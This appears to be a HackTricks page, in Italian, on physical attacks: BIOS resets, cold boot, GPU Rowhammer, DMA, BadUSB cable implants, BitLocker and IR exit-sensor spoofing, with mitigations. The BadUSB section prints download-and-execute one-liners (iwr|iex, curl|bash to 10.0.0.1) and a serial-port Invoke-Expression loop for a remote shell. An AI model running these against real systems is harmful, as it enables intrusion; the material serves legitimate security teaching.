# Attacchi fisici

{{#include ../banners/hacktricks-training.md}}

## Recupero della password BIOS e sicurezza del sistema

Le impostazioni del firmware dei PC legacy possono essere reimpostate scollegando la batteria CMOS o usando un jumper clear-CMOS documentato. Il tempo necessario per lasciare il dispositivo senza alimentazione varia in base alla scheda; le password UEFI moderne o le chiavi possono risiedere in una memoria flash non volatile, in un controller embedded o in un dispositivo di sicurezza e quindi sopravvivere alla rimozione della batteria. Consulta il manuale della scheda o dell'assistenza prima di cortocircuitare i pin; questa procedura può anche invalidare le misurazioni del TPM e attivare il ripristino della crittografia del disco.

Sui sistemi x86 legacy, strumenti come **killCMOS** e **CmosPwd** possono esaminare o modificare le impostazioni memorizzate nella CMOS da un ambiente avviabile. CmosPwd riconosce i formati di password di un insieme documentato di vecchie famiglie di BIOS e può eseguire il backup, il ripristino o la cancellazione/terminazione dello stato della CMOS; le versioni pubblicate sono destinate ad ambienti DOS/Windows, Linux, FreeBSD e NetBSD legacy.<sup>[[18]](#references)</sup> Queste utility non rimuovono genericamente le password UEFI e richiedono un accesso sufficiente all'hardware e al firmware.

Alcuni firmware per laptop visualizzano un codice di verifica specifico del produttore dopo diversi tentativi di password non riusciti. Database come [bios-pw.org](https://bios-pw.org) possono ricavare password di ripristino legacy del produttore per alcuni modelli, ma molti sistemi implementano un blocco senza un codice di verifica ricavabile. Considera qualsiasi password generata specifica per il modello ed evita di esaurire i contatori permanenti dei tentativi.

### Sicurezza UEFI

Per i sistemi **UEFI** moderni, CHIPSEC può verificare le protezioni delle variabili Secure Boot. Inizia con il controllo non modificante qui sotto; la modalità facoltativa `-a modify` tenta deliberatamente di corrompere le variabili e va usata solo su un sistema di laboratorio recuperabile. CHIPSEC stesso avverte che il suo driver con privilegi e l'accesso hardware a basso livello non sono adatti agli endpoint di produzione.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analisi della RAM e Cold Boot Attacks

La DRAM non perde immediatamente tutti i bit quando si interrompe il refresh. Il tasso di decadimento varia notevolmente in base alla tecnologia del modulo e alla temperatura; il raffreddamento può preservare dati utili molto più a lungo rispetto a un ciclo di spegnimento e riaccensione senza raffreddamento. Un cold-boot attack riavvia rapidamente il sistema in un ambiente di acquisizione minimale o trasferisce un modulo raffreddato, acquisisce la memoria grezza e ricostruisce le chiavi crittografiche nonostante il decadimento dei bit. Un'utilità per copiare dischi non è automaticamente uno strumento per acquisire la memoria fisica, e Volatility analizza un'acquisizione, ma non la esegue; usa uno strumento di acquisizione validato e adatto alla piattaforma.<sup>[[12]](#references)</sup>

---

## Rowhammer su GPU contro le page table

I moderni attacchi GPU Rowhammer diventano molto più efficaci quando prendono di mira i **metadati della memoria virtuale della GPU** invece dei normali buffer. Ricerche recenti sulle **GPU NVIDIA Ampere con GDDR6** mostrano che un attaccante che esegue codice CUDA senza privilegi può creare pattern di hammering specifici per la GPU, usare il **memory massaging** per collocare strutture di paging in righe vulnerabili e poi invertire bit nella **page table di ultimo livello** o in una **page directory** intermedia. Una volta corrotta una singola voce di traduzione, l'attaccante può ottenere **lettura/scrittura arbitraria della memoria GPU** e poi passare alla compromissione dell'host.<sup>[[1]](#references)[[2]](#references)</sup>

### Schema di exploit

1. **Individuare le righe vulnerabili al hammering** nella GDDR6 e creare pattern di hammering non uniformi e consapevoli del refresh, che aggirino le mitigazioni in DRAM.
2. **Manipolare le allocazioni della GPU** affinché il driver collochi le strutture di traduzione delle pagine in posizioni fisiche vulnerabili al hammering, anziché mantenerle nel pool protetto predefinito. In pratica, ciò può comportare l'esaurimento della regione a bassa memoria delle page table e la creazione di numerose mappature UVM sparse, con stride controllati.
3. **Invertire i metadati di traduzione**, ad esempio i bit **PFN** o quelli relativi all'apertura, all'interno di una voce di page table o page directory, in modo che la pagina virtuale controllata dall'attaccante punti a pagine delle page table, a memoria GPU arbitraria o a mappature di sistema visibili all'host.
4. Riutilizzare la mappatura contraffatta per riscrivere altre voci di traduzione e ottenere **lettura/scrittura arbitraria della memoria GPU** attraverso diversi contesti GPU.

### Passaggio all'host e mitigazioni

- Con **IOMMU disabilitato**, le mappature contraffatte dell'apertura di sistema possono esporre alla GPU qualsiasi **memoria fisica dell'host**, trasformando la primitiva GPU in una compromissione completa dell'host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** prende di mira le voci delle page table di ultimo livello, mentre **GeForge** dimostra che corrompere un livello della page directory può essere più semplice, poiché un singolo bit invertito può reindirizzare un sottoalbero di traduzione più ampio. Non considerare un solo livello di paging come critico per la sicurezza.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** resta importante perché blocca il percorso diretto verso la memoria host arbitraria usato da GDDRHammer/GeForge, ma **non è una mitigazione completa**. **GPUBreach** mostra un passaggio in una seconda fase, in cui l'attaccante corrompe buffer CPU scrivibili dalla GPU e di proprietà del driver, poi attiva bug di memory-safety nel driver NVIDIA per ottenere una primitiva di scrittura nel kernel e una **shell root**, anche con IOMMU abilitato.<sup>[[3]](#references)</sup>
- **ECC a livello di sistema** è una misura pratica di hardening sulle GPU workstation/server supportate. Le GPU consumer senza ECC offrono una superficie di difesa più debole.<sup>[[4]](#references)</sup>
- Questi attacchi non sono puramente teorici: **GeForge** ha riportato **1.171** bit invertiti su una RTX 3060 e **202** su una RTX A6000, sufficienti a costruire una catena funzionante di escalation dei privilegi sull'host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Attacchi Direct Memory Access (DMA)

Per l'applicazione offline di patch a UEFI IFR/NVRAM, che può ridurre l'applicazione dell'IOMMU in fase di pre-boot e abilitare una catena DMA su Windows, consulta:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** dimostra l'acquisizione e la modifica della memoria tramite **DMA** su interfacce come FireWire e sulle prime configurazioni Thunderbolt, includendo firme storiche per aggirare il login. Non è semplicemente «inefficace contro Windows 10»: la possibilità di sfruttarlo dipende dall'interfaccia, dalla build target, dalla policy IOMMU, dallo stato di blocco e dal supporto e dall'attivazione di Windows Kernel DMA Protection. Windows 10 versione 1803 e successive ha introdotto Kernel DMA Protection sulle piattaforme compatibili, modificando sostanzialmente la superficie di attacco.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB per accedere al sistema

Su un volume Windows non crittografato o già sbloccato, un ambiente offline può sostituire i binari delle funzionalità di accessibilità, come **sethc.exe** o **Utilman.exe**, con **cmd.exe**, ottenendo un prompt dei comandi SYSTEM quando si usa la scorciatoia corrispondente nella schermata di accesso. Strumenti come **chntpw** possono modificare i dati degli account locali SAM. Questi metodi non aggirano un volume BitLocker bloccato e possono danneggiare le credenziali protette da DPAPI/EFS; conserva copie forensi e backup.

**Kon-Boot** è uno strumento commerciale per aggirare l'autenticazione all'avvio, compatibile con determinate configurazioni Windows/macOS. La compatibilità dipende dal sistema operativo, dalla modalità firmware, da Secure Boot e dalla configurazione della crittografia del disco; non decritta un volume BitLocker bloccato.<sup>[[10]](#references)</sup>

---

## Gestione delle funzionalità di sicurezza di Windows

### Scorciatoie di avvio e ripristino

- **Delete/Supr**, F2, F10 o un altro tasto specifico del produttore possono aprire la configurazione del firmware.
- **F8** apre le opzioni di avvio avanzate legacy di Windows solo nelle configurazioni in cui tale percorso è ancora abilitato; l'accesso al ripristino varia nelle versioni attuali.
- Tenere premuto **Shift** può impedire l'accesso automatico a Windows in alcune configurazioni, anche se le impostazioni dei criteri o del registro possono disabilitare questo comportamento.<sup>[[17]](#references)</sup>

### Dispositivi BAD USB

Dispositivi come **USB Rubber Ducky** e le schede Teensy possono enumerarsi come tastiere HID attendibili e iniettare sequenze di tasti predefinite. Il payload inizialmente dispone dei privilegi e dell'accesso al desktop della sessione connessa; le richieste UAC, il blocco dello schermo, il layout della tastiera, i tempi di esecuzione e le policy USB degli endpoint continuano a limitarlo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

I privilegi di amministratore o di backup consentono di creare una shadow copy o salvare gli hive del registro, così da acquisire file bloccati come **SAM** e **SYSTEM**. Questa è una tecnica di raccolta post-compromissione, non un aggiramento dei privilegi, e dovrebbe essere correlata agli eventi di `diskshadow`/VSS e di esportazione degli hive del registro.

## Tecniche di impianto BadUSB / HID

### Impianti Wi-Fi integrati nei cavi

- Gli impianti basati su ESP32-S3, come **Evil Crow Cable Wind**, si nascondono all'interno di cavi USB-A→USB-C o USB-C↔USB-C, si enumerano esclusivamente come tastiera USB ed espongono il proprio stack C2 tramite Wi-Fi. All'operatore basta alimentare il cavo dal sistema della vittima, creare un hotspot chiamato `Evil Crow Cable Wind` con password `123456789` e visitare [http://cable-wind.local/](http://cable-wind.local/) (o il relativo indirizzo DHCP) per raggiungere l'interfaccia HTTP integrata.<sup>[[8]](#references)</sup>
- L'interfaccia web offre schede per *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* e *Config*. I payload archiviati sono contrassegnati in base al sistema operativo, i layout della tastiera possono essere cambiati al volo e le stringhe VID/PID possono essere modificate per imitare periferiche note.
- Poiché il C2 è integrato nel cavo, un telefono può preparare i payload, avviarne l'esecuzione e gestire le credenziali Wi-Fi senza usare la rete dell'organizzazione: è utile per intrusioni fisiche di breve durata.

### Payload AutoExec consapevoli del sistema operativo

- Le regole AutoExec associano uno o più payload da eseguire immediatamente dopo l'enumerazione USB. L'impianto identifica il sistema operativo in modo leggero e seleziona lo script corrispondente.
- Flusso di lavoro di esempio:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminale) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Poiché l'esecuzione è automatica, basta sostituire un cavo di ricarica per ottenere l'accesso iniziale «plug-and-pwn» nel contesto dell'utente connesso.

### Shell remota avviata tramite HID su Wi-Fi TCP

1. **Bootstrap tramite sequenza di tasti:** un payload archiviato apre una console e incolla un ciclo che esegue tutto ciò che arriva dal nuovo dispositivo seriale USB. Una variante minima per Windows è:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Bridge via cavo:** L’impianto mantiene aperto il canale USB CDC mentre il suo ESP32-S3 avvia una connessione TCP client (script Python, APK Android o eseguibile desktop) verso l’operatore. Qualsiasi byte digitato nella sessione TCP viene inoltrato al loop seriale descritto sopra, consentendo l’esecuzione remota di comandi anche su host isolati dalla rete. L’output è limitato, quindi gli operatori in genere eseguono comandi senza poter vedere i risultati (creazione di account, predisposizione di strumenti aggiuntivi, ecc.).

### Superficie di aggiornamento HTTP OTA

- L’interfaccia documentata di Evil Crow Cable espone un endpoint di aggiornamento del firmware non autenticato su `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Gli operatori sul campo possono sostituire a caldo le funzionalità (ad es., flashare il firmware di USB Army Knife) durante un intervento, senza aprire il cavo, consentendo all’impianto di passare a nuove capacità restando collegato all’host bersaglio.

## Bypass della cifratura BitLocker

Un’acquisizione forense autorizzata di un sistema attivo o avviato di recente può contenere una chiave master del volume BitLocker o materiale crittografico correlato mentre il volume è sbloccato. Strumenti commerciali come Elcomsoft Forensic Disk Decryptor e Passware Kit Forensic possono esaminare immagini di memoria supportate, file di ibernazione o dump di arresto anomalo, ma il successo non è garantito. Le versioni moderne di Windows cifrano anche i dump di arresto anomalo quando BitLocker è attivo, e una password di ripristino di 48 cifre salvata è un artefatto diverso da una chiave del volume presente in memoria.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social engineering per aggiungere una chiave di ripristino

Un aggressore che convince un amministratore a eseguire comandi di gestione di BitLocker può aggiungere un password protector, un external-key protector o un altro protector, per poi acquisirlo. Una password di ripristino non può essere una stringa arbitraria di zeri: le password di ripristino numeriche di BitLocker devono rispettare un formato convalidato di 48 cifre. La sintassi pertinente per l’amministrazione autorizzata è `manage-bde -protectors -add C: -recoverypassword`; elenca i protector risultanti con `manage-bde -protectors -get C:`. Monitora le aggiunte di protector e assicurati che il nuovo materiale di ripristino venga archiviato esclusivamente in posizioni approvate.<sup>[[16]](#references)</sup>

---

## Sfruttare gli switch di intrusione nel telaio / manutenzione per ripristinare il BIOS alle impostazioni di fabbrica

Molti laptop moderni e desktop compatti includono uno **switch di intrusione nel telaio**, monitorato dall’Embedded Controller (EC) e dal firmware BIOS/UEFI. Sebbene lo scopo principale dello switch sia generare un avviso quando il dispositivo viene aperto, a volte i produttori implementano una **scorciatoia di ripristino non documentata**, attivata quando lo switch viene azionato secondo una sequenza specifica.<sup>[[5]](#references)[[6]](#references)</sup>

### Come funziona l’attacco

1. Lo switch è collegato a un **interrupt GPIO** dell’EC.
2. Il firmware in esecuzione sull’EC tiene traccia della **tempistica e del numero di pressioni**.
3. Quando viene riconosciuta una sequenza predefinita, l’EC richiama una routine di *mainboard-reset* che **cancella il contenuto della NVRAM/CMOS di sistema**.
4. Al successivo avvio, i modelli interessati caricano lo stato firmware ripristinato. A seconda del produttore e della revisione, lo stato cancellato può includere una password supervisor, impostazioni di avvio personalizzate o chiavi Secure Boot registrate; lo stato del TPM e gli effetti sulla cifratura del disco devono essere valutati separatamente.

> Un ripristino del firmware può riattivare le opzioni di avvio da dispositivi esterni, ma **non** decifra i dati archiviati. BitLocker o un altro sistema di cifratura dell’intero disco può entrare in modalità di ripristino dopo modifiche al TPM o al firmware e continuare a proteggere l’unità interna in assenza di una chiave di ripristino.<sup>[[16]](#references)</sup>

### Esempio reale – laptop Framework 13

La scorciatoia di ripristino per il Framework 13 (11ª/12ª/13ª generazione) è:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Dopo il decimo ciclo, l’EC imposta un flag che istruisce il BIOS a cancellare la NVRAM al riavvio successivo. L’intera procedura richiede circa 40 s e **solo un cacciavite**.<sup>[[5]](#references)</sup>

### Procedura generica di exploitation

1. Accendi o sospendi e riattiva il target, in modo che l’EC sia in esecuzione.
2. Rimuovi il coperchio inferiore per accedere all’interruttore di intrusione/manutenzione.
3. Riproduci la sequenza di attivazione specifica del vendor (consulta la documentazione e i forum oppure esegui il reverse engineering del firmware dell’EC).
4. Rimonta il dispositivo e riavvialo, quindi verifica quali impostazioni del firmware e credenziali sono effettivamente cambiate.
5. Se autorizzato e se è possibile avviare da un supporto esterno, avvia un’immagine live controllata. Una volta sbloccato legittimamente un volume interno (oppure se non era mai stato cifrato), l’ambiente live può acquisire credenziali e dati o esaminare la EFI System Partition. Modificare tale partizione per installare un EFI implant è un’operazione persistente e altamente invasiva, soggetta ai limiti imposti da Secure Boot, measured boot, protezione dalla scrittura del firmware e monitoraggio degli endpoint. Lo storage cifrato resta inaccessibile senza la chiave o il materiale di recovery.

### Rilevamento e mitigazione

* Registra gli eventi di intrusione nello chassis nella console di gestione del sistema operativo e correla gli eventi con gli imprevisti reset del BIOS.
* Usa **sigilli antimanomissione** su viti e coperchi per rilevarne l’apertura.
* Mantieni i dispositivi in **aree ad accesso fisico controllato**; considera che l’accesso fisico equivale a una compromissione totale.
* Se disponibile, disabilita la funzionalità vendor “maintenance switch reset” oppure richiedi un’autorizzazione crittografica aggiuntiva per i reset della NVRAM.

---

## Iniezione IR covert contro i sensori di uscita no-touch

### Caratteristiche dei sensori
- I sensori commerciali “wave-to-exit” abbinano un emettitore LED a infrarossi vicini a un modulo ricevitore simile a quello di un telecomando TV, che segnala un livello logico alto solo dopo aver rilevato più impulsi (~4–10) della portante corretta (≈30 kHz).<sup>[[7]](#references)</sup>
- Un involucro in plastica impedisce all’emettitore e al ricevitore di guardarsi direttamente, così il controller presume che ogni portante convalidata provenga da una riflessione nelle vicinanze e attiva un relè che apre la serratura della porta.
- Quando il controller rileva la presenza di un target, spesso modifica l’inviluppo di modulazione in uscita, ma il ricevitore continua ad accettare qualsiasi burst corrispondente alla portante filtrata.

### Flusso dell’attacco
1. **Acquisisci il profilo di emissione** – collega un analizzatore logico ai pin del controller per registrare le forme d’onda, prima e dopo il rilevamento, che pilotano il LED IR interno.
2. **Riproduci solo la forma d’onda “post-rilevamento”** – rimuovi o ignora l’emettitore originale e pilota un LED IR esterno con il pattern già attivato fin dall’inizio. Poiché al ricevitore interessa solo il conteggio degli impulsi e la frequenza, considera la portante contraffatta una riflessione autentica e attiva la linea del relè.
3. **Intervalla la trasmissione** – trasmetti la portante in burst calibrati (ad esempio, decine di millisecondi di emissione e un intervallo simile) per fornire il numero minimo di impulsi senza saturare l’AGC del ricevitore o la logica di gestione delle interferenze. Un’emissione continua desensibilizza rapidamente il sensore e impedisce al relè di scattare.

### Iniezione riflessa a lungo raggio
- Sostituendo il LED da banco con un diodo IR ad alta potenza, un driver MOSFET e ottiche di focalizzazione è possibile attivare il sensore in modo affidabile da circa 6 m di distanza.
- L’attaccante non deve avere una linea di vista diretta verso l’apertura del ricevitore; puntando il fascio verso pareti interne, scaffali o telai delle porte visibili attraverso il vetro, l’energia riflessa può entrare nel campo visivo di ~30° e simulare un gesto della mano a distanza ravvicinata.
- Poiché i ricevitori sono progettati per rilevare solo riflessioni deboli, un fascio esterno molto più potente può rimbalzare su più superfici e restare comunque sopra la soglia di rilevamento.

### Torcia d’attacco weaponised
- Integrando il driver in una torcia commerciale, lo strumento si mimetizza in bella vista. Sostituisci il LED visibile con un LED IR ad alta potenza, adatto alla banda del ricevitore, aggiungi un ATtiny412 (o simile) per generare i burst a ≈30 kHz e usa un MOSFET per assorbire la corrente del LED.
- Una lente telescopica zoom concentra il fascio per aumentarne la portata e la precisione, mentre un motore vibrante controllato dall’MCU fornisce una conferma aptica dell’attivazione della modulazione senza emettere luce visibile.
- Passare in rassegna diversi pattern di modulazione memorizzati (con frequenze della portante e inviluppi leggermente diversi) aumenta la compatibilità tra famiglie di sensori rimarchiati, consentendo all’operatore di scandire le superfici riflettenti finché il relè non scatta con un clic udibile e la porta si apre.

---

## References

- [1] [GDDRHammer: disturbare gravemente le righe DRAM — attacchi Rowhammer cross-component dalle GPU moderne](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: usare Rowhammer sulla memoria GDDR per contraffare le tabelle delle pagine GPU, per divertimento e profitto](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: attacchi di privilege escalation sulle GPU tramite Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Avviso di sicurezza: Rowhammer - luglio 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Premi qui per fare pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Guida al reset della scheda madre](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassare i sensori di uscita IR no-touch con una torcia IR covert”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Collega, avvia, fai pwn: hacking con Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Attacco Rowhammer contro i chip NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Documentazione ufficiale e informazioni di compatibilità di Kon-Boot](https://kon-boot.com/)
- [11] [Documentazione di CHIPSEC - protezioni delle variabili Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: attacchi cold boot alle chiavi di cifratura](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipolazione della memoria fisica tramite DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - protezione Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Documentazione di Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - guida operativa di BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - comportamento del tasto Maiusc e dell’accesso automatico](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - documentazione e download di CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
